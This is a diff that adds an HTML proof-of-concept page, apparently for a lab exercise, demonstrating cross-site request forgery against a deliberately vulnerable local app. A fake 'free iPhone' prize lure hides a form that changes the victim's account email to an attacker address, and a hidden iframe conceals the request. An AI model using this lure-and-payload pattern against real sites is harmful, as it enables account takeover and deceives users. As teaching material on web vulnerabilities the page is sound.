@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Win a Free iPhone 15!</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; text-align: center; background: #ffebee; padding-top: 50px; }
+        .box { background: white; max-width: 500px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h1 { color: #d32f2f; }
+        .btn { background: #ff9800; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; font-weight: bold; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px;}
+        .btn:hover { background: #f57c00; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p>You have been selected to win a free iPhone 15 Pro Max!</p>
+        <p>Click the button below to claim your prize before time runs out!</p>
+
+        <!-- The hidden CSRF form targeting the VULNERABLE SecureCollab app -->
+        <form id="csrf-form" action="http://localhost/securecollab-vulnerable/profile/change_email.php" method="POST" target="hidden_iframe">
+            <!-- This is the attacker's email they want to set on the victim's account -->
+            <input type="hidden" name="email" value="hacker@attacker.local">
+        </form>
+
+        <!-- The iframe prevents the browser from visibly navigating away when the form submits -->
+        <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+        <button class="btn" onclick="document.getElementById('csrf-form').submit(); alert('Processing your prize! Check your email soon.');">
+            CLAIM PRIZE NOW!
+        </button>
+        <p style="font-size: 0.8rem; color: #999; margin-top: 30px;">This is an attacker-controlled site demonstrating CSRF.</p>
+    </div>
+</body>
+</html>
